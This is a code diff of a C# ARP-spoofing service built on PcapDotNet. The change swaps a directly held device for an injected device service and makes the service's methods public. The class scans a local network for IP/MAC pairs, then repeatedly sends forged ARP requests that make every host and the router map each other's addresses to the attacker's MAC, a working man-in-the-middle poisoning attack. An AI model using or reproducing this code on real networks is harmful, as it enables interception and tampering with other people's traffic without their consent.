@@ -1,4 +1,5 @@
 ﻿using ArpSpoofer.DTO;
+using ArpSpoofer.ServiceContracts;
 using PcapDotNet.Core;
 using PcapDotNet.Packets;
 using PcapDotNet.Packets.Arp;
@@ -14,34 +15,34 @@ using System.Threading.Tasks;
 
 namespace ArpSpoofer.Services
 {
-    public class ARPSpoofingService
+    public class ARPSpoofingService : IARPSpoofingService
     {
-        public DeviceWithDescription Device;
+        IWifiDeviceService _deviceService;
         CancellationTokenSource cancelTokenSource;
         Dictionary<string, string> _ipMacPairs;
         public event EventHandler<double> ScanTick;
         public event EventHandler<IpMacPair> NewIpMacFound;
         public bool IsScanning { get; set; }
         public bool IsPoisoning { get; set; }
-        public ARPSpoofingService(DeviceWithDescription device)
+        public ARPSpoofingService(IWifiDeviceService deviceService)
         {
-            Device = device;
+            _deviceService = deviceService;
             cancelTokenSource = new CancellationTokenSource();
             IsScanning = false;
             IsPoisoning = false;
             _ipMacPairs = new Dictionary<string, string>();
         }
 
-        internal async void StartPoisoning()
+        public async void StartPoisoning()
         {
             IsPoisoning = true;
-            var routerMac = _ipMacPairs.Single(x => x.Value == Device.GatewayString).Key;
+            var routerMac = _ipMacPairs.Single(x => x.Value == _deviceService.DeviceWithDescription.GatewayIpString).Key;
             if (string.IsNullOrEmpty(routerMac))
             {
-                throw new KeyNotFoundException(Device.GatewayString);
+                throw new KeyNotFoundException(_deviceService.DeviceWithDescription.GatewayIpString);
             }
 
-            var communicator = Device.Device.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000);
+            var communicator = _deviceService.DeviceWithDescription.Device.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000);
             MacAddress source = new MacAddress(routerMac.Replace('-', ':'));
             EthernetLayer ethernetLayer = new EthernetLayer
             {
@@ -64,13 +65,13 @@ namespace ArpSpoofer.Services
                     }
                     foreach (var kvp in _ipMacPairs)
                     {
-                        if (kvp.Value != Device.GatewayString)
+                        if (kvp.Value != _deviceService.DeviceWithDescription.GatewayIpString)
                         {
-                            ethernetLayer.Source = new MacAddress(Device.MacString.Replace('-', ':'));
+                            ethernetLayer.Source = new MacAddress(_deviceService.DeviceWithDescription.DeviceMacString.Replace('-', ':'));
                             ethernetLayer.Destination = new MacAddress(kvp.Key.Replace('-', ':'));
                             arpLayer.Operation = ArpOperation.Request;
-                            arpLayer.SenderHardwareAddress = Array.AsReadOnly(Device.MacByte);
-                            arpLayer.SenderProtocolAddress = Array.AsReadOnly(Device.GatewayString.Split('.').Select(str => byte.Parse(str)).ToArray());
+                            arpLayer.SenderHardwareAddress = Array.AsReadOnly(_deviceService.DeviceWithDescription.DeviceMacByte);
+                            arpLayer.SenderProtocolAddress = Array.AsReadOnly(_deviceService.DeviceWithDescription.GatewayIpString.Split('.').Select(str => byte.Parse(str)).ToArray());
                             arpLayer.TargetHardwareAddress = Array.AsReadOnly(kvp.Key.Split('-').Select(str => Convert.ToByte(str, 16)).ToArray());
                             arpLayer.TargetProtocolAddress = Array.AsReadOnly(kvp.Value.Split('.').Select(str => byte.Parse(str)).ToArray());
 
@@ -79,13 +80,13 @@ namespace ArpSpoofer.Services
                             Thread.Sleep(2000);
 
                             // spoof router
-                            ethernetLayer.Source = new MacAddress(Device.MacString.Replace('-', ':'));
+                            ethernetLayer.Source = new MacAddress(_deviceService.DeviceWithDescription.DeviceMacString.Replace('-', ':'));
                             ethernetLayer.Destination = new MacAddress(routerMac.Replace('-', ':'));
                             arpLayer.Operation = ArpOperation.Request;
-                            arpLayer.SenderHardwareAddress = Array.AsReadOnly(Device.MacByte);
+                            arpLayer.SenderHardwareAddress = Array.AsReadOnly(_deviceService.DeviceWithDescription.DeviceMacByte);
                             arpLayer.SenderProtocolAddress = Array.AsReadOnly(kvp.Value.Split('.').Select(str => byte.Parse(str)).ToArray());
                             arpLayer.TargetHardwareAddress = Array.AsReadOnly(routerMac.Split('-').Select(str => Convert.ToByte(str, 16)).ToArray());
-                            arpLayer.TargetProtocolAddress = Array.AsReadOnly(Device.GatewayString.Split('.').Select(str => byte.Parse(str)).ToArray());
+                            arpLayer.TargetProtocolAddress = Array.AsReadOnly(_deviceService.DeviceWithDescription.GatewayIpString.Split('.').Select(str => byte.Parse(str)).ToArray());
 
                             packet = builder.Build(DateTime.Now);
                             communicator.SendPacket(packet);
@@ -97,12 +98,12 @@ namespace ArpSpoofer.Services
             communicator.Dispose();
         }
 
-        internal void StopPoisoning()
+        public void StopPoisoning()
         {
             IsPoisoning = false;
         }
 
-        internal void Scan()
+        public void Scan()
         {
             if (IsScanning == false)
             {
@@ -113,7 +114,7 @@ namespace ArpSpoofer.Services
             }
         }
 
-        internal void StopScan()
+        public void StopScan()
         {
             if (IsScanning == true)
             {
@@ -125,9 +126,9 @@ namespace ArpSpoofer.Services
         private async void ArpAddresses()
         {
             _ipMacPairs.Clear();
-            var communicator = Device.Device.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000);
+            var communicator = _deviceService.DeviceWithDescription.Device.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000);
 
-            MacAddress source = new MacAddress(Device.MacString.Replace('-', ':'));
+            MacAddress source = new MacAddress(_deviceService.DeviceWithDescription.DeviceMacString.Replace('-', ':'));
             MacAddress destination = new MacAddress("ff:ff:ff:ff:ff:ff");
             EthernetLayer ethernetLayer = new EthernetLayer
             {
@@ -136,13 +137,13 @@ namespace ArpSpoofer.Services
                 EtherType = EthernetType.None
             };
 
-            var ipVals = Device.IpV4.Split('.').Select(x => byte.Parse(x)).ToArray();
+            var ipVals = _deviceService.DeviceWithDescription.IpV4.Split('.').Select(x => byte.Parse(x)).ToArray();
 
             ArpLayer arpLayer = new ArpLayer
             {
                 ProtocolType = EthernetType.IpV4,
                 Operation = ArpOperation.Request,
-                SenderHardwareAddress = Array.AsReadOnly(Device.MacByte),
+                SenderHardwareAddress = Array.AsReadOnly(_deviceService.DeviceWithDescription.DeviceMacByte),
                 SenderProtocolAddress = Array.AsReadOnly(ipVals),
                 TargetHardwareAddress = Array.AsReadOnly(new byte[] { 0, 0, 0, 0, 0, 0 }),
                 //TargetProtocolAddress = new byte[] { 192, 168, 1, 1 }, // 11.22.33.44.
@@ -195,7 +196,7 @@ namespace ArpSpoofer.Services
 
         private void ListenForReplys()
         {
-            var communicator = Device.Device.Open(200, PacketDeviceOpenAttributes.Promiscuous, 1000);
+            var communicator = _deviceService.DeviceWithDescription.Device.Open(200, PacketDeviceOpenAttributes.Promiscuous, 1000);
 
             using (BerkeleyPacketFilter filter = communicator.CreateFilter("arp"))
             {
